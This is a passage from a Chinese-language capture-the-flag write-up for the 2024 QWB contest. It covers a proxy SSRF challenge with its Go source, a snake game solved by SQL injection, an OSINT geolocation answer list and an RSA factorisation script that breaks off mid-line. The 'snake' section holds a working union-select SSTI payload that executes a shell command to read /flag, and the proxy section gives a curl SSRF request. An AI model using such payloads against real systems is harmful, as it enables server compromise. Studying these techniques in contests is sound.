class="string">&#x27;/index.php&#x27;</span>, headers=headers, data=data,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    response3 = r.post(url + <span class="string">&#x27;/dashboard.php&#x27;</span>,params=params,headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response3.text:</span><br><span class="line">        <span class="built_in">print</span>(response3.text)</span><br><span class="line">        <span class="built_in">print</span>(r.cookies)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(response3.text)</span><br><span class="line">        <span class="built_in">print</span>(r.cookies)</span><br><span class="line">    r.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>有源码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">	Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">	FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line">			<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			client := &amp;http.Client&#123;</span><br><span class="line">				CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">				req.Header.Set(key, value)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">			body, err := io.ReadAll(resp.Body)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Status(resp.StatusCode)</span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">				c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Writer.Write(body)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-112855.png" alt="1"></p>
<p>得到发包格式</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-113006.png" alt="1"></p>
<p>这里直接就可以拿到flag，那我们直接<code>curl</code>发包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@dkcjbRCL8kgaNGz:~# curl -X POST http://47.94.231.2:30773/v2/api/proxy \</span><br><span class="line">-H &quot;Content-Type: application/json&quot; \</span><br><span class="line">-d &#x27;&#123;</span><br><span class="line">    &quot;url&quot;: &quot;http://127.0.0.1:8769/v1/api/flag&quot;,</span><br><span class="line">    &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">    &quot;body&quot;: &quot;&quot;,</span><br><span class="line">    &quot;headers&quot;: &#123;&#125;,</span><br><span class="line">    &quot;follow_redirects&quot;: false</span><br><span class="line">&#125;&#x27;</span><br><span class="line">&#123;&quot;flag&quot;:&quot;ZmxhZ3s1ZWRlMjYzYi0xZjAzLTRhNGYtYTUyMC1jNGM4ZjE3MzYyOWF9&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>然后解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ede263b-1f03-4a4f-a520-c4c8f173629a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>进来是个贪吃蛇，肯定是要通关才能够拿到<code>flag</code>，那么我们爆破爬取路由</p>
<p>拿到<code>/snake_win</code></p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-120440.png" alt="1"></p>
<p>测出有sql注入漏洞，尝试注入之后没有结果</p>
<p>响应头也没说是什么web服务，测试了很久发现可以<code>ssti</code></p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-121106.png" alt="1"></p>
<p>man，flag终于是要到我手里了嘛</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze762llzxw5o9w9mbw2.cloudeci1.ichunqiu.com:5000/snake_win?username=1&#x27; union select 1,2,&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(&#x27;__import__(\&#x27;os\&#x27;).popen(\&#x27;tac /flag\&#x27;).read()&#x27;)&#125;&#125;&quot;-- -</span><br></pre></td></tr></table></figure>

<h2 id="Master-of-OSINT"><a href="#Master-of-OSINT" class="headerlink" title="Master of OSINT"></a>Master of OSINT</h2><p>进来之后发现是个找图片</p>
<p>使用工具慢慢she出经纬度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://api.map.baidu.com/lbsapi/getpoint/index.html</span><br><span class="line"></span><br><span class="line">https://map.baidu.com/search/</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-134528.png" alt="1"></p>
<p>看到有湖并且这里很平，打开地图，国内有湖的地方就这两个</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-134727.png" alt="1"></p>
<p>挨着试找到是海南藏族自治州这里</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-180630.png" alt="1"></p>
<p>百安居(这里注意要下载，不然看不到这个)</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150334.png" alt="1"></p>
<p>第三张图的话就很熟悉了，因为我在成都，这是双流机场</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150654.png" alt="1"></p>
<p>这里一个大卡车重汽(找物流公司)</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-150923.png" alt="1"></p>
<p>这不是一模一样？</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-151627.png" alt="1"></p>
<p>这一看就是重庆继续找找这个高架</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-151900.png" alt="1"></p>
<p>简直了</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152134.png" alt="1"></p>
<p>还是高架，每个图都在高架上面基本是</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152633.png" alt="1"></p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152707.png" alt="1"></p>
<p>这个好搞，橘子洲</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-152844.png" alt="1"></p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154417.png" alt="1"></p>
<p>这个我都不用看，长江大桥</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154457.png" alt="1"></p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-154642.png" alt="1"></p>
<p>ok终于是找完了，最后经过两年半的查找答案如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一 99.974383,36.66725</span><br><span class="line">二 121.567039,31.211279</span><br><span class="line">三 103.966657,30.571185</span><br><span class="line">四 120.293197,30.346334</span><br><span class="line">五 106.524114,29.52509</span><br><span class="line">六 118.783635,32.013335</span><br><span class="line">七 112.969521,28.201853</span><br><span class="line">八 121.734859,31.412815</span><br><span class="line">九 114.412567,30.661017</span><br><span class="line">十 120.308631,30.152785</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241103-012118.png" alt="1"></p>
<h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h2><p>先进去拿参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N=42904039314199895721696616855758464218776719155277644688156355421669731926586744657558904856662524664815001053906568694877941070734379088087661446033173083187445772619113110948584643982194462341444480231060053008290646295405517083378534377980681311369011669792894523149142258780642722178595904015146283411763379803572408919306199860289071979553687419537458952652653841956474558202437419097277523814620107550505762949933586019973892299407282425426574324269936979456148685237646197700304901043932950332167503114720687804083313706537708157799145007429182143131211123753832870983386421744654743615691456503687433253700707</span><br><span class="line">e=65537</span><br><span class="line">g=2467289273249224073499308128504701193779913828213444430435151093961964204649293591016042690390824880024231535639632722916163130665022776513946276332507</span><br><span class="line">enc=12709693287264155874588327905007095658924584817796376099734882542910731460825766770672115564368497141711860077407627137628906166192867282903038794375385103923117937259213778979889844254053587067543343272153487237062941786040827781296627252935285712565966813858306852382594194367821015639439066528157046594978868346586874763813295540162505405425455235498583512373062022633584465000726414162171619788788030500551923136766813781433302278483256483999391289749744953431408447702944986393707616176873212339507135665819552507676368414131287311936039623896380645989109820457591105147343119080909601863364535862069112518457752</span><br></pre></td></tr></table></figure>

<p>这靶机我之前一直没看到我丢，然后就不用管靶机了，其次不要关靶机，我关了靶机导致一直跑不出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">import</span> random, gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAEncryptor</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.g = <span class="variable language_">self</span>.a = <span class="variable language_">self</span>.b = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.e = <span class="number">65537</span></span><br><span class="line">        <span class="variable language_">self</span>.factorGen()</span><br><span class="line">        <span class="variable language_">self</span>.product()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">factorGen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="variable language_">self</span>.g = getPrime(<span class="number">500</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*<span class="variable language_">self</span>.g*<span class="variable language_">self</span>.a+<span class="number">1</span>):</span><br><span class="line">                <span class="variable language_">self</span>.a = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(<span class="number">2</span>*<span class="variable language_">self</span>.g*<span class="variable language_">self</span>.b+<span class="number">1</span>):</span><br><span class="line">                <span class="variable language_">self</span>.b = random.randint(<span class="number">2</span>**<span class="number">523</span>, <span class="number">2</span>**<span class="number">524</span>)</span><br><span class="line">            <span class="variable language_">self</span>.h = <span class="number">2</span>*<span class="variable language_">self</span>.g*<span class="variable language_">self</span>.a*<span class="variable language_">self</span>.b+<span class="variable language_">self</span>.a+<span class="variable language_">self</span>.b</span><br><span class="line">            <span class="keyword">if</span> gmpy2.is_prime(<span class="variable language_">self</span>.h):</span><br><span class="line">                <span class="variable language_">self</span>.N = <span class="number">2</span>*<span class="variable language_">self</span>.h*<span class="variable language_">self</span>.g+<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(<span class="variable language_">self</span>.N)))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> gmpy2.powmod(msg, <span class="variable language_">self</span>.e, <span class="variable language_">self</span>.N)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.flag = f.read()</span><br><span class="line">        <span class="comment"># Convert flag to an integer before encryption</span></span><br><span class="line">        flag_int = bytes_to_long(<span class="variable language_">self</span>.flag)</span><br><span class="line">        <span class="variable language_">self</span>.enc = <span class="variable language_">self</span>.encrypt(flag_int)</span><br><span class="line">        <span class="variable language_">self</span>.show()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;self.enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;N=<span class="subst">&#123;self.N&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;e=<span class="subst">&#123;self.e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;g=<span class="subst">&#123;self.g&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">RSAEncryptor()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>生成素数和模数 (<code>N</code>)</strong>:<ul>
<li><code>self.g</code> 是一个500位的素数。</li>
<li><code>self.a</code> 和 <code>self.b</code> 是随机生成的数，它们使得 <code>2*self.g*self.a+1</code> 和 <code>2*self.g*self.b+1</code> 是素数。</li>
<li><code>self.h</code> 是 <code>2*self.g*self.a*self.b+self.a+self.b</code>，且 <code>self.h</code> 也是素数。</li>
<li><code>N</code> 被计算为 <code>2*self.h*self.g+1</code>。</li>
</ul>
</li>
<li><strong>加密过程</strong>:<ul>
<li>使用公钥 <code>(N, e)</code>，其中 <code>e</code> 是常用的 <code>65537</code>。</li>
<li>消息用 <code>gmpy2.powmod(msg, e, N)</code> 进行加密。</li>
</ul>
</li>
<li><strong>解密的挑战</strong>:<ul>
<li>通常，RSA解密需要私钥 <code>(d)</code>，它通过求解 <code>ed ≡ 1 (mod φ(N))</code> 获得。这里 <code>φ(N)</code> 是欧拉函数，通常是 <code>(p-1)(q-1)</code>，<code>p</code> 和 <code>q</code> 是 <code>N</code> 的两个素数因子。</li>
</ul>
</li>
</ol>
<p>解密的话我们</p>
<ol>
<li><strong>模数分解 (Factorization)</strong>:<ul>
<li>目标是将大整数模数 N<em>N</em> 分解为两个素数乘积 p<em>p</em> 和 q<em>q</em>。在此方案中，利用已知的结构 p&#x3D;2ga+1<em>p</em>&#x3D;2<em>g**a</em>+1 和 q&#x3D;2gb+1<em>q</em>&#x3D;2<em>g**b</em>+1 进行推导。</li>
</ul>
</li>
<li><strong>中国剩余定理 (Chinese Remainder Theorem, CRT)</strong>:<ul>
<li>使用求解 <code>u</code> 和 <code>v</code> 的过程，间接利用了模数分解的结构特性，通过推导近似根来简化计算过程。</li>
</ul>
</li>
<li><strong>指数求逆 (Modular Inversion)</strong>:<ul>
<li>计算私钥指数 d<em>d</em> 的过程利用了模逆运算。具体来说，通过求解 d≡e−1(modϕ(N))<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>N</em>))，其中 ϕ(N)&#x3D;(p−1)(q−1)<em>ϕ</em>(<em>N</em>)&#x3D;(<em>p</em>−1)(<em>q</em>−1)。</li>
</ul>
</li>
<li><strong>密文解密 (Ciphertext Decryption)</strong>:<ul>
<li>使用模幂运算实现解密，即 m&#x3D;Cd(modN)<em>m</em>&#x3D;<em>C**d</em>(mod<em>N</em>)。</li>
</ul>
</li>
<li><strong>平方根逼近 (Root Approximation)</strong>:<ul>
<li>通过 <code>iroot</code> 函数计算平方根，利用近似和迭代方法逼近解。</li>
</ul>
</li>
<li><strong>数论攻击 (Number Theory Attack)</strong>:<ul>
<li>整个解密方案可以视为基于数论特性的攻击，通过已知因子关系和结构性弱点来恢复加密密钥。</li>
</ul>
</li>
</ol>
<p>最后写个脚本，此时一定要注意，把<code>r</code>和<code>s</code>写大一点节省时间不然靶机都没了可能还是跑不出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, iroot, powmod, invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># N = pq 2050bit; p 1025 bit; q 1025 bit</span></span><br><span class="line">N=mpz(<span class="string">&quot;36485011506081204249353320553950613538202089151659637848115802055074144483670941532556535766902145921973594997027479624905209949691271762025427477743585502482131332590436695347051791231697483166685773359997599962390951389807897889989842749391578113929807413080535375105955893148740093617956725535911664750114893144869800480780770094530308687537645720410428791977178530996923717038507261474355948618508166751918076068001409953063336528028033025761084181080126504217426369672569710112079242859636376145175734678264411553576130988579634184334371125938410224579198183934903162942790258446634362761502507649065084540399627&quot;</span>)</span><br><span class="line"><span class="comment"># g 500bit; is p-1 and q-1 prime factor</span></span><br><span class="line"><span class="comment"># p = 2*g*a + 1; q = 2*g*b + 1</span></span><br><span class="line">g=mpz(<span class="string">&quot;2247113742037388549126827263530967729647876171160434451719365936820171519384453150516592428020693798355300913115889019295485975565435074105418185872653&quot;</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C=mpz(<span class="string">&quot;8723174185243286745778722165394947826680341325024406927179799187651216273269550886122199189840469819205011474538291123038948795537734295353538048662643560558613222940652432465387821767869659987332731872376334835470075829738040916495874122194399361612840158429781298635579378738659475708516663189740417547967046498681970164226439603650301067936899183776866269511992054665324683444422921359125980570625643493195848148074925368422310976126635090617900612294394294526142884055556163913650939907516297466755311082324437407938032687938659279120158022331434516948954703962993479193049714934370005556711772066538439821538739&quot;</span>)</span><br><span class="line"><span class="comment"># Calculate h, u, and v</span></span><br><span class="line">h = (N - <span class="number">1</span>) // g</span><br><span class="line">u = h // g</span><br><span class="line">v = h % g</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Solve_c</span>():</span><br><span class="line">    <span class="comment"># Calculate approximate square root of N</span></span><br><span class="line">    sqrt_N = iroot(mpz(N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    C_approx = sqrt_N // (g * g)  <span class="comment"># 确保结果为整数</span></span><br><span class="line"></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    b = powmod(a, g, N)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop over possible values of C</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(C_approx) + <span class="number">1</span>):  <span class="comment"># 